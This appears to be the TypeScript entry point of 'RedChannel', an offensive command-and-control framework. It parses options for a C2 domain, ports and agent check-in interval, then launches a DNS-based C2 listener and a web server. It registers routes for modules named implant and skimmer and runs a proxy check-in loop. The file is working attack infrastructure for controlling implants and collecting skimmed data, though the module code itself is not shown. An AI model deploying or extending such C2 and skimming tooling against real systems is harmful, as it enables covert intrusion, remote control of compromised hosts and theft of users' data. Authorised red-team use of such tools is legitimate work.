import chalk from "chalk";
import * as dnsd from "dnsd2";
import { Command as Commander } from "commander";
import express from "express";

import RedChannel, { ModulesConfig } from "./lib/redchannel";
import UserInterface from "./lib/ui";
import Logger from "./lib/logger";
import { Config, Constants, Banner, emsg } from "./utils/utils";
import { C2ModuleConfig } from "./modules/c2";

const cli = new Commander();
cli.version(Constants.VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", Config.DEFAULT_CONFIG_FILE)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --domain <domain>", "specify the c2 domain")
    .option("-B, --ip [ip]", "bind dns c2 to ip")
    .option("-P, --port [port]", "listen for dns on a specific port")
    .option("-W, --web-ip [ip]", "bind web server to ip")
    .option("-Y, --web-port [port]", "listen for web on a specific port")
    .option("-I, --agent-interval [ms]", "checkin interval for the agent")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent")
    .option("-d, --debug", "enable debug", false)
    .parse();

// env password takes priority over commandline
const cliPassword = (process.env.RC_PASSWORD as string) ?? (cli.getOptionValue("password") as string);
if (!cliPassword) {
    throw new Error("please specify a master c2 password via command-lie or environment variable, see '--help'");
}

const cliConfig: ModulesConfig = {
    c2: {
        domain: cli.getOptionValue("domain"),
        dns_ip: cli.getOptionValue("ip"),
        dns_port: cli.getOptionValue("port"),
        web_ip: cli.getOptionValue("webIp"),
        web_port: cli.getOptionValue("webPort"),
        interval: cli.getOptionValue("agentInterval"),
        debug: cli.getOptionValue("debug"),
    },
    implant: {
        resolver: cli.getOptionValue("agentResolver"),
    },
    proxy: {},
    agent: {},
    skimmer: {},
    static_dns: {},
};

const cliConfigFilePath = cli.getOptionValue("config");

let redchannel: RedChannel;
try {
    redchannel = new RedChannel(cliPassword, cliConfig, cliConfigFilePath);
} catch (ex) {
    new Logger().error(`Error instantiating RedChannel: ${emsg(ex)}`);
    throw ex;
}

const ui = new UserInterface(redchannel);
redchannel.log = ui;

ui.msg(chalk.redBright(Banner));

process.on("uncaughtException", (ex, origin) => {
    ui.error(`process error: ${emsg(ex)}, origin: ${origin}`);
});

const webServer = express();

redchannel.modules.skimmer.setupRoutes(webServer, ui);
redchannel.modules.implant.setupRoutes(webServer, ui);

/**
 * c2-web listener
 */
const c2Config = redchannel.modules.c2.config as C2ModuleConfig;
webServer.listen(c2Config.web_port, c2Config.web_ip, () => {
    ui.info(`c2-web listening on: ${redchannel.modules.c2.config.web_ip}:${redchannel.modules.c2.config.web_port}`);
});

/**
 * DNS channel
 */
const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel));

dnsServer.on("error", (ex: Error, msg: Error) => {
    ui.error(`dns server error: ${emsg(ex)}, msg: ${emsg(msg)}`);
});

// prettier-ignore
dnsServer
    .zone(
        c2Config.domain,
        'ns1.' + c2Config.domain,
        'root@' + c2Config.domain,
        'now',
        '2h',
        '30m',
        '2w',
        '10m'
    )
    .listen(c2Config.dns_port, c2Config.dns_ip);

ui.info(`c2-dns listening on: ${redchannel.modules.c2.config.dns_ip}:${c2Config.dns_port}, c2 domain: ${c2Config.domain}`);

const proxyModule = redchannel.modules.proxy;
if (proxyModule.config.enabled) {
    ui.info(`c2-proxy enabled, checkin at interval: ${proxyModule.config.interval}ms`);
    proxyModule.proxyFetchLoop();
} else {
    ui.info("c2-proxy is disabled, see 'use proxy' -> 'help'");
}
